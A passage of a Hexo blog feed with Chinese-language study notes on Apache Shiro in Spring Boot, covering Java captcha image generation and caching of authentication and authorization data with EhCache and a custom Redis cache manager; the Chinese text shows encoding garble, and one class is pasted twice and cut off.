<span class="params">w1</span>, <span class="params">h1</span>, <span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">        shear<span class="constructor">Y(<span class="params">g</span>, <span class="params">w1</span>, <span class="params">h1</span>, <span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static void shear<span class="constructor">X(Graphics <span class="params">g</span>, <span class="params">int</span> <span class="params">w1</span>, <span class="params">int</span> <span class="params">h1</span>, Color <span class="params">color</span>)</span> &#123;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> period = random.next<span class="constructor">Int(2)</span>;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        boolean border<span class="constructor">Gap</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> frames = 1;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> phase = random.next<span class="constructor">Int(2)</span>;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        for (<span class="built_in">int</span> i = 0; i &lt; h1; i<span class="operator">++</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">            double d = (double) (period &gt;&gt; 1)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">*</span> <span class="constructor">Math</span>.sin((double) i <span class="operator">/</span> (double) period</span></span><br><span class="line"><span class="pattern-match">                    + (6.2831853071795862<span class="constructor">D</span> <span class="operator">*</span> (double) phase)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">/</span> (double) frames);</span></span><br><span class="line"><span class="pattern-match">            g.copy<span class="constructor">Area(0, <span class="params">i</span>, <span class="params">w1</span>, 1, (<span class="params">int</span>)</span> d, 0);</span></span><br><span class="line"><span class="pattern-match">            <span class="keyword">if</span> (border<span class="constructor">Gap</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">                g.set<span class="constructor">Color(<span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line((<span class="params">int</span>)</span> d, i, 0, i);</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line((<span class="params">int</span>)</span> d + w1, i, w1, i);</span></span><br><span class="line"><span class="pattern-match">            &#125;</span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static void shear<span class="constructor">Y(Graphics <span class="params">g</span>, <span class="params">int</span> <span class="params">w1</span>, <span class="params">int</span> <span class="params">h1</span>, Color <span class="params">color</span>)</span> &#123;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> period = random.next<span class="constructor">Int(40)</span> + 10; <span class="operator">/</span><span class="operator">/</span> 50;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        boolean border<span class="constructor">Gap</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> frames = 20;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> phase = 7;</span></span><br><span class="line"><span class="pattern-match">        for (<span class="built_in">int</span> i = 0; i &lt; w1; i<span class="operator">++</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">            double d = (double) (period &gt;&gt; 1)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">*</span> <span class="constructor">Math</span>.sin((double) i <span class="operator">/</span> (double) period</span></span><br><span class="line"><span class="pattern-match">                    + (6.2831853071795862<span class="constructor">D</span> <span class="operator">*</span> (double) phase)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">/</span> (double) frames);</span></span><br><span class="line"><span class="pattern-match">            g.copy<span class="constructor">Area(<span class="params">i</span>, 0, 1, <span class="params">h1</span>, 0, (<span class="params">int</span>)</span> d);</span></span><br><span class="line"><span class="pattern-match">            <span class="keyword">if</span> (border<span class="constructor">Gap</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">                g.set<span class="constructor">Color(<span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line(<span class="params">i</span>, (<span class="params">int</span>)</span> d, i, 0);</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line(<span class="params">i</span>, (<span class="params">int</span>)</span> d + h1, i, h1);</span></span><br><span class="line"><span class="pattern-match">            &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match">    public static void main(<span class="constructor">String</span>[] args) throws <span class="constructor">IOException</span> &#123;</span></span><br><span class="line"><span class="pattern-match">        <span class="operator">/</span><span class="operator">/</span>è·å–éªŒè¯ç </span></span><br><span class="line"><span class="pattern-match">        <span class="constructor">String</span> s = generate<span class="constructor">VerifyCode(4)</span>;</span></span><br><span class="line"><span class="pattern-match">        <span class="operator">/</span><span class="operator">/</span>å°†éªŒè¯ç æ”¾å…¥å›¾ç‰‡ä¸­</span></span><br><span class="line"><span class="pattern-match">        output<span class="constructor">Image(260,60,<span class="params">new</span> File(<span class="string">"/Users/chenyannan/Desktop/å®‰å·¥èµ„æ–™/aa.jpg"</span>)</span>,s);</span></span><br><span class="line"><span class="pattern-match">        <span class="constructor">System</span>.out.println(s);</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match">&#125;</span></span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±åšå¥½äº†</p><p>åˆ°è¿™é‡Œshiroå°±å…¨éƒ¨ç»“æŸäº† <del>è™½ç„¶è¿˜æœ‰ä¸€ä¸ªthymeleaf ä½†æ˜¯æˆ‘ä¸æƒ³å­¦äº†</del></p><p><a href="/download/springboot_jsp_shiro.zip">æºç ä¸‹è½½</a></p><p>ğŸŒ¸ğŸŒ¸ğŸŒ¸å®Œç»“æ’’èŠ±ğŸŒ¸ğŸŒ¸ğŸŒ¸</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;del&gt;æˆ‘æ˜¯ä¸€åªé¸½å­ å’•å’•å’•&lt;/del&gt;&lt;/p&gt;
&lt;h1 id=&quot;å›¾å½¢éªŒè¯ç &quot;&gt;&lt;a href=&quot;#å›¾å½¢éªŒè¯ç &quot; class=&quot;headerlink&quot; title=&quot;å›¾å½¢éªŒè¯ç &quot;&gt;&lt;/a&gt;å›¾å½¢éªŒè¯ç &lt;/h1&gt;&lt;p&gt;å›¾ç‰‡éªŒè¯ç å°±ä¸å¤šä»‹ç»äº†&lt;br&gt;ä¿®æ”¹login.jsp&lt;br
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/12/9-ç¼“å­˜</title>
    <link href="http://yoursite.com/2020/12/09/Shiro-2020-12-9-EhCache%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/12/09/Shiro-2020-12-9-EhCache%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-12-09T05:11:47.000Z</published>
    <updated>2021-02-21T08:22:21.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h1><p>é¡µé¢ä¸­æƒé™çš„æ•°æ®æ¯æ¬¡è®¿é—®éƒ½ä¼šä¸æ•°æ®åº“è¿›è¡Œä¸€æ¬¡äº¤äº’ è¿™æ ·å°±å¯¼è‡´ç”¨æˆ·æ•°é‡å¤šçš„æ—¶å€™ è®¿é—®é‡å¤§çš„æ—¶å€™  å°±ä¼šå¯¼è‡´æ•°æ®åº“å‹åŠ›è¿‡å¤§</p><p>æ‰€ä»¥ä¸ºäº†é¿å…è¿™ç§é—®é¢˜  å°±éœ€è¦ç»™æƒé™çš„æ•°æ®åŠ ç¼“å­˜  è¿™æ ·éœ€è¦æƒé™çš„æ—¶å€™å¯¹äºå·²ç»æˆæƒçš„ç”¨æˆ·å°±ä¸ç”¨ä¸æ•°æ®åº“äº¤äº’  ç›´æ¥åœ¨ç¼“å­˜ä¸­å»æ‰¾å¯¹åº”çš„æƒé™å°±å¥½äº†  å¯ä»¥å°½é‡å‡è½»æ•°æ®åº“çš„å‹åŠ›</p><h2 id="CacheManager"><a href="#CacheManager" class="headerlink" title="CacheManager"></a>CacheManager</h2><h3 id="Cacheä½œç”¨"><a href="#Cacheä½œç”¨" class="headerlink" title="Cacheä½œç”¨"></a>Cacheä½œç”¨</h3><ul><li><p>Cacheç¼“å­˜ï¼šè®¡ç®—æœºå†…å­˜ä¸­ä¸€æ®µæ•°æ® å†…å­˜æ¡</p></li><li><p>ä½œç”¨ï¼šç”¨æ¥å‡è½»DBçš„è®¿é—®å‹åŠ›ï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„æŸ¥è¯¢æ•ˆç‡</p></li><li><p>æµç¨‹ï¼š<br><img src="/img/JavaWeb/12-9å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p></li></ul><p>è¿™é‡Œè¦æ³¨æ„ åªæœ‰æŸ¥è¯¢æ¬¡æ•°å¤šå¹¶ä¸”å¢åˆ æ”¹æå°‘çš„æ•°æ®æ‰é€‚åˆå­˜å…¥ç¼“å­˜ä¸­</p><h3 id="EhCacheå®ç°ç¼“å­˜"><a href="#EhCacheå®ç°ç¼“å­˜" class="headerlink" title="EhCacheå®ç°ç¼“å­˜"></a>EhCacheå®ç°ç¼“å­˜</h3><ol><li>å¼•å…¥ä¾èµ–</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        shiro-ehcache--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-ehcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>å¼€å¯ç¼“å­˜ç®¡ç†</li></ol><p>åœ¨ShiroConfigä¸­å¼€å¯ç¼“å­˜ç®¡ç†<br>æ·»åŠ ä»£ç <br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¼€å¯ç¼“å­˜ç®¡ç†</span></span><br><span class="line">customerRealm.set<span class="constructor">CacheManager(<span class="params">new</span> RedisCacheManager()</span>);</span><br><span class="line">customerRealm.set<span class="constructor">CachingEnabled(<span class="params">true</span>)</span>;<span class="comment">//å¼€å¯å…¨å±€ç¼“å­˜</span></span><br><span class="line">customerRealm.set<span class="constructor">AuthenticationCachingEnabled(<span class="params">true</span>)</span>;<span class="comment">//è®¤è¯è®¤è¯ç¼“å­˜</span></span><br><span class="line">customerRealm.set<span class="constructor">AuthenticationCacheName(<span class="string">"authenticationCache"</span>)</span>;</span><br><span class="line">customerRealm.set<span class="constructor">AuthorizationCachingEnabled(<span class="params">true</span>)</span>;<span class="comment">//å¼€å¯æˆæƒç¼“å­˜</span></span><br><span class="line">customerRealm.set<span class="constructor">AuthorizationCacheName(<span class="string">"authorizationCache"</span>)</span>;</span><br></pre></td></tr></table></figure><br>å¼€å¯ä¹‹å åªæœ‰ç¬¬ä¸€æ¬¡ä¼šæ“ä½œæˆ‘ä»¬çš„æ•°æ®åº“ ä¹‹åå°±ä¸ä¼šæ“ä½œæ•°æ®åº“äº† å› ä¸ºå·²ç»å­˜åˆ°äº†ç¼“å­˜å½“ä¸­<br>ä½†æ˜¯ä½¿ç”¨è¿™æ ·çš„æ–¹æ³•ä¼šæœ‰ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯å¦‚æœå½“æœåŠ¡å™¨æ–­ç”µæˆ–å®•æœºæ—¶ï¼Œé‡æ–°è®¿é—®ä¾ç„¶ä¼šæ“ä½œæ•°æ®åº“ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨Redisæ¥å®ç°ä¸€ä¸ªåˆ†å¸ƒå¼ç¼“å­˜</p><h3 id="Rediså®ç°ç¼“å­˜"><a href="#Rediså®ç°ç¼“å­˜" class="headerlink" title="Rediså®ç°ç¼“å­˜"></a>Rediså®ç°ç¼“å­˜</h3><ol><li>å¼•å…¥redisä¾èµ–<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--redisæ•´åˆspringboot--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>é…ç½®redisè¿æ¥<br>æ³¨æ„è¿›è¡Œè¿™æ­¥ä¹‹å‰ éœ€è¦å…ˆå®‰è£…redis ç¡®ä¿æ­£å¸¸è¿è¡Œ<br>åœ¨application.propertiesæ·»åŠ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.redis.port</span>=<span class="number">6379</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=localhost</span><br><span class="line"><span class="attr">spring.redis.database</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>è‡ªå®šä¹‰ç¼“å­˜ç®¡ç†å™¨</li></ol><p>å…ˆåœ¨shiroä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„åŒ…cache<br>æ–°å»ºä¸€ä¸ªRedisCacheManager.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.Cache;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰shiroç¼“å­˜ç®¡ç†å™¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisCacheManager</span> <span class="keyword">implements</span> <span class="title">CacheManager</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å‚æ•°1:è®¤è¯æˆ–è€…æ˜¯æˆæƒç¼“å­˜çš„ç»Ÿä¸€åç§°</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;K, V&gt; <span class="function">Cache&lt;K, V&gt; <span class="title">getCache</span><span class="params">(String cacheName)</span> <span class="keyword">throws</span> CacheException </span>&#123;</span><br><span class="line">        System.out.println(cacheName);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RedisCache&lt;K,V&gt;(cacheName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä¿®æ”¹ShiroConfigçš„ç¼“å­˜ç®¡ç†å™¨æŒ‡å®šæˆ‘ä»¬è‡ªå®šä¹‰çš„Redisç®¡ç†å™¨<br>ShiroConfig<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">customerRealm.setCacheManager(<span class="keyword">new</span> <span class="type">RedisCacheManager</span>());</span><br></pre></td></tr></table></figure><br>å†å†™ä¸€ä¸ªRedisCache.java  è¿™ä¸ªæ‰æ˜¯çœŸæ­£å®ç°ç¼“å­˜çš„æ“ä½œ</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.ApplicationContextUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.Cache;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰redisç¼“å­˜çš„å®ç°</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisCache</span>&lt;<span class="type">k,v</span>&gt; <span class="title">implements</span> <span class="title">Cache</span>&lt;<span class="type">k,v</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cacheName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache(String cacheName) &#123;</span><br><span class="line">        <span class="keyword">this</span>.cacheName = cacheName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v <span class="keyword">get</span>(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"get key:"</span>+k);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().<span class="keyword">get</span>(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v put(k k, v v) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put key: "</span>+k);</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put value:"</span>+v);</span><br><span class="line">        getRedisTemplate().opsForHash().put(<span class="keyword">this</span>.cacheName,k.toString(),v);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v remove(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============remove============="</span>);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().delete(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void clear() throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============clear=============="</span>);</span><br><span class="line">        getRedisTemplate().delete(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> int size() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().size(<span class="keyword">this</span>.cacheName).intValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;k&gt; keys() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().keys(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;v&gt; values() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().values(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate getRedisTemplate()&#123;</span><br><span class="line">        RedisTemplate redisTemplate = (RedisTemplate) ApplicationContextUtils.getBean(<span class="string">"redisTemplate"</span>);</span><br><span class="line">        redisTemplate.setKeySerializer(new StringRedisSerializer());</span><br><span class="line">        redisTemplate.setHashKeySerializer(new StringRedisSerializer());</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.ApplicationContextUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.Cache;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰redisç¼“å­˜çš„å®ç°</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisCache</span>&lt;<span class="type">k,v</span>&gt; <span class="title">implements</span> <span class="title">Cache</span>&lt;<span class="type">k,v</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cacheName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache(String cacheName) &#123;</span><br><span class="line">        <span class="keyword">this</span>.cacheName = cacheName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v <span class="keyword">get</span>(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"get key:"</span>+k);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().<span class="keyword">get</span>(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v put(k k, v v) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put key: "</span>+k);</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put value:"</span>+v);</span><br><span class="line">        getRedisTemplate().opsForHash().put(<span class="keyword">this</span>.cacheName,k.toString(),v);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v remove(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============remove============="</span>);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().delete(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void clear() throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============clear=============="</span>);</span><br><span class="line">        getRedisTemplate().delete(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> int size() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().size(<span class="keyword">this</span>.cacheName).intValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;k&gt; keys() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().keys(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;v&gt; values() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().values(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate 